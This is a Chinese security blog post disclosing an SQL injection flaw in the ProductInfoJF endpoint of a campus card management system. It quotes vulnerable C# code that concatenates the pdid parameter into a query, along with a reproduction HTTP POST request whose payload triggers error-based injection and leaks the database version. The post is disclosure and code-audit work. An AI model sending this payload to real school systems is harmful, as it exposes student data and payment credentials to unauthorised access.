---
title: "新中新校园卡管理系统 ProductInfoJF SQL注入漏洞"
source: https://mrxn.net/jswz/ProductInfoJF-sqli.html
asset_dir: assets/新中新校园卡管理系统-productinfojf-sql注入漏洞
---

# 新中新校园卡管理系统 ProductInfoJF SQL注入漏洞

[Mrxn](https://mrxn.net/author/1)- 发表于2025/1/21 19:31
- 1686浏览
- [0评论](#comment)
- 22分钟阅读

---

# 漏洞简介

新中新中小学智慧校园信息管理系统 ProductInfoJF 接口存在SQL注入漏洞，未经身份验证的远程攻击者除了可以利用 [SQL 注入](https://mrxn.net/tag/sql%E6%B3%A8%E5%85%A5 "SQL 注入")漏洞获取数据库中的信息（例如，管理员后台密码、站点的用户个人信息）之外，甚至在高权限的情况可向服务器中写入木马，进一步获取服务器系统权限。

SQL注入防护

# 漏洞分析

ProductInfoJF 主要业务代码逻辑实现如下：

```
public System.Web.Mvc.ActionResult ProductInfoJF(string pdid)
    {
      try
      {
        int hour = DateTime.Now.Hour;
        if (hour >= 22 || hour <= 2)
          return (System.Web.Mvc.ActionResult) this.Content("微信充值时间【02:00-22:00】.");
        object obj1 = this.IocBase.RECHARGERECService.ExecSqlQuery("declare @ACCNO int,@Name varchar(16),@PayMoney decimal(18,2),@Title varchar(40), @DSMAID int, @YSMAID int, @RECIVE int, @APPID varchar(80), @WxPayMchID varchar(32), @WxPayMchKey  varchar(32), @WxPayState int, @ScList bigint, @AreaId int, @MID int select @Title = pb.TITLE, @PayMoney = case when pb.PAYMONEY>0 then pb.PAYMONEY else pd.PAYMONEY end, @ACCNO = pd.ACCOUNTNO, @Name = tr.Name, @DSMAID = m.DSMAID, @YSMAID = m.MAID, @RECIVE = m.WxPayRecive, @WxPayMchID = m.WxPayMchID, @WxPayMchKey = m.WxPayMchKey, @WxPayState = m.PayTypeState, @MID = m.MID, @ScList = m.LIST, @AreaId = m.AreaID from MERCHANTACC m, PAYMENTBILL pb, PAYMENTDEAIL pd, TabRecord tr where pd.PDID = " + pdid + " and pd.PBID = pb.PBID and pb.MAID = m.MAID and pd.ACCOUNTNO = tr.AccountNo if (@RECIVE = 0) begin select @WxPayMchID = m.WxPayMchID,@WxPayMchKey = m.WxPayMchKey,@WxPayState = m.PayTypeState,@MID = m.MID,@ScList = m.LIST,@AreaId = m.AreaID from MERCHANTACC m,YWPLATFORM y where m.MAID = @DSMAID end if (@MID is not null) begin select @APPID = APPID from MERCHANT where MID = @MID end else if (@ScList is not null) begin select @APPID = APPID from SCHOOLRUNSET where List = @ScList end else if (@AreaId is not null) begin select @APPID = APPID from YWPLATFORM where areaid = @AreaId end select @ACCNO as ACCNO,@Name as Name,@Title as Title,@PayMoney as PayMoney,@WxPayState as WxPayState, @RECIVE as RECIVE,@DSMAID as DSMAID,@YSMAID as YSMAID,@APPID as AppID,@WxPayMchID as WxPayMchID,@WxPayMchKey as WxPayMchKey")[0];
```

可以看到 将 `pdid` 直接拼接进SQL语句，造成SQL注入[漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E "漏洞")。

# 漏洞复现

```
POST /WeiXin/ProductInfoJF HTTP/1.1
Host: test.mrxn.net
Content-Type: application/x-www-form-urlencoded

pdid=-1/user--
```

[![新中新校园卡管理系统 ProductInfoJF SQL注入漏洞](images/img-001-2197de7c416a.webp)](https://image.mrxn.net/78a8aaa77a674c09bbf0b0ad6564441a.webp)

通过报错注入成功回显数据库版本信息

代码安全审计

- 标签：
- [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
- [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
- [#SQL注入](https://mrxn.net/tag/SQL%E6%B3%A8%E5%85%A5)
- [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)

---

文章目录

- [1.漏洞简介](#toc-1-)
- [2.漏洞分析](#toc-2-)
- [3.漏洞复现](#toc-3-)

  
  

![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAGQAAABkCAYAAABw4pVUAAAKfElEQVR4AeycgXLjOA5E8/b//3lPLUwTkEjTspPYvh1OGWmouwHKhGgnW1f3z9fX17/fjX9P/2o/S5Wb5faPcFZXtVpr3pyvheYqileMOPHnsO/MP3utgWy16/UpO9AGsk3665GYvYHaB/gCDvaqOz8Ynrz4iV7uAez3DUz3ZXSr7nEVa482kEqu/H070A0E8smAPr9yq5B1fkqu1MkDWQvH3L0qqmYW9kL08rXwSp18ELWQOKu1BumHPrevYjeQKq789TuwBvL6PZ+u+LKB6Og7pnc0EEd1EB8B1oQQHPQ4aNu+tOGaX2s4IGpGfb/DvWwg37nJv6n2RwcCt58aCA1o+wu0p9RPXhO3ZMRt9M2X/RVtNufrZxDm9/tMz3PNjw6kNV/J0zuwBvL01v1OYTcQH+1bOLuNUQ3EMa910HPWaw8IHwTa8wi6H9zuYU/FR9a45a39RvmorhvIyLS41+1AGwjEEwTXcHSLELUjrT4h1isH92shPJD/fQmSc1/oOWv3EKJ25Lt6vxA94BrWtdpAKrny9+3AGsj79n648j/1GD6bnztDHtWzpmuvA9d8qlG4TqhrhXKHrhW+FkKsoVwBcQ3jjz15FJA+9bwXqvmJWCfk3k6/WO8GAvlkQOSje4LQIHHk81NTNYgaa0LrEBpgqiHQ/rKHPm/Gkqi3olBdKt0B0bczbQSEBuPTBaFv1v0FcQ3s11d+dAO5UvQmz1+x7D/A4akbvWs4eiCfED1ZrlF+Dohae4T2QGiA6D2sCYH93nZh+yHOsV3uL18Ld2L7AVEHiRvdvSD0TtgI9TvHRrcXHGurF45aK9oSCA0SN7q91glpW/EZyRrIZ8yh3UX3a29TtqQew3MOeeSsQXIQ+UjbWu8vaxUh6oDdox/A4aNLnGsgNEiU7rDP1xVH2ohzjbUR2vMIuk+tWSek7sYH5E8PxNMVQjydyhXPvC+IHrVWvWpAeCCx6s5rDwhv5c45hAc4Szevgf3UQo+j+3Aja0JzkD2eHoibLfzZHVgD+dn9/Ha39neIO+koOSCOkrWKEBrk3yRVfzb32sJzD3HnqB6Ie6qeqp9z6P0QHCS6DpLzGtZ8LYTwKXdAcJDo2orrhNTd+IC8DQRicqN7gtCAJnvywkb+ScQ5/lAHALovxIPhzwUcfX/oHeCoATt//uH7APY1fV2x1lTeuXVfC82NULpipN3j2kDuGZf+mh1YA3nNPl9epf2lfrUC4uhD4rkWUoPIdYQd9vtaaK6ieEXlZrm8Cog1IXFWd0+D6DPyaT0FhAfG6Fp5HRBea8J1QrQLHxRtIJ5avbcZZ03oGugnLl0BoQG271+ywI4mIa4hUfUKe4S6Pod4xZmv19LPAbnWWavXkD6IvOrOvZ6vhTPOmrANREUr3r8DayDvn8HhDtpf6hBHEBLt1FFymIPeZ+23EHJNiHy0FoQGNBk4fDQ2YUv83oRw27dZ20tehQnlDnNXEWJN4GudkK9f+fd00+lAICZXu0NwfhqE1pUrfC2E+/5zjepqwO0eEBokqp/DfXwN6bMGyY185ipC1gButSOwn8bq34XtB4QGidU3HchWv14v3oH2h6GnVNc3BzlN65AcRG7NdUJzEB7A1P4UATvKew4bzUN4AUtDBPaekDgyQugj7Srne6t+cxD9gSq33L5GbMk6IdsmfNJrDeSTprHdS/u1d8sfevm4CV0IXPqoUI3CdVdRNeeotdYqN8vtr2j/iIN8f/ZBcnDMaw8IzXVC6Ll1QrQzHxTtS/3qPXnqENMFWqm1ETZTSaoPuHS6XA7hH/WonHPX+VoI0QN6tF8IoSu/EuqtuOKVB6I/sP4w/Pqwf+sj61MHAnFsdNQcvldfC2ccRA97votaT+E+EP3h+f+lC2QP99UaDnMjtEdoXbnC10KINZQ/GuuEPLpjv+zvfu2FmC4kju4Bel1PigJSg8jFO0b9zNkjNGcU54Doa60ihAZUes9dL9yJCz/kVVSrrhXA/suIcod9EBrkibZHaJ9yxzoh3pUPwTWQDxmEb2M6EB8jm4UQx9BaRemKyjmHqINEeR32+fo76F5CyPWAu21Vo7hnBA4fVff81iHqAFN7H2DH6UBaxUpetgPdX+p6Ohyzu4CYKPQ4q5M26g99HwhONQqIa8gvSfHngPSdtdE19H6Yc34PEL7a11rlnFuraE24Toh24YOi/drridV7g3761u0fIUQdYPvh/x26kSUZ9TFnm6+F5oD9sxfy1Eh32He+Nn8L7RdCrFG9EJx0BcQ10GziHUC7T4i8GUvyhhNSVl9ptwNrIN2WvJfovtTr7YyO24irNcrtEcLt4ymvA8IHPdpTEcI34iA0yI8x+6DXdJ8OSB0id+0IITyuF0JwkOha6Q4I3ZpwnRDtwgdF+1L3PUFMDRKtVfSUhRDeql/JIeqAZlc/RyMHycgz4oD9y9Qt7BHCUbNHKP0c4m8FRC+gWWp9I0tSdefrhJQN+oR0DeQTplDuoRuIj84tdC2wfxRAfnFCchC5+7iuojWheYg6wNQQgX191Tqg56yNmliDqIN8L9UPoVfOtZVzbg2iDrB0QGB/D5DYDeRQsS5evgPdr72Q04LIR3flp0AI4VOuqH4IrXLOITTIJ1P1DvuM0PshOftmCL3f6wldC+kTr7BWUbyichC14s8BoUG+51r7nzkh9U39P+drIB82ve7vkPMR0zXkMfP9w21ONY6RH6LWWkUIDWg0sH/5NeIbie9LOGsj3QGxvq+FEBwE1l7SFZWD3mddXsc6Id6VD8HuS73eF1ybqqdrhKiD/OKyJqxrzHJ5bwXEGiO99oTwQeBMg/DAEWvNOff6lYdjPVDlab5OyHR7Xi+ugbx+z6crtoEA+xcnJPo4VnQ3SB9Ebq0ihAaJtZ9zCP1eLYTvXAe0UqC9F/uMzfRA4lrIvi6H4Hz9CELUQmIbyCONlvf3dqANxE9Bxdmy1eccYtKjOnuE1iH8kF/+1iqqRlE5iFrxDghu5KvcOXe90JpyB/R9Rz77jfZUtCasvPM2EBML6w68Pm9/GEI8BfA4Xrlt6PvqKXG4h68rWqtovXKj3D6I9avH2oiD8MP89LoW0m+u4mgt69aE64R4Vz4E10A+ZBC+jTYQHZdHwg0qjuqtV83cCOH20b/ao/og+pmra0JokGjdfiGErtxhn9G80Nw9lFdRfW0glVz5+3agGwjE0wBjvHKrkLVX/PJA1OiJcUBw0s8BoUGiPTDnIHSvUxFCc697COGHHke1kD7rkFw3EJsWvmcH1kDes+83V/3RgUAcvdFqEBrQZKD9N6dGlsQfJYW6lLpOeKUA5vfhHtD7tMatcN0j+KMDeWThv9k7e++/MpD6xMwWrz7nIz/EkznS7nGzvq61R2iuovhzVP2cQ9xvrbFnxFkT/spA1HjFczuwBvLcvv1aVTeQeqRG+exO7K8ecyOEONqQWGsheHMQ14Cpuwjsvzg8s76bQ/TwdUUIDRK9FiRXa5xD6PYLu4HYvPA9O9AGAjEtuIaz24VrPfREOEb9rBmr5ypXa865e4zw7L117dqRbk0I/Z6MatpARuLiXr8DayCv3/Ppiv8DAAD//+56+5YAAAAGSURBVAMA+4ZAhvYf9OoAAAAASUVORK5CYII=)

手机扫码阅读
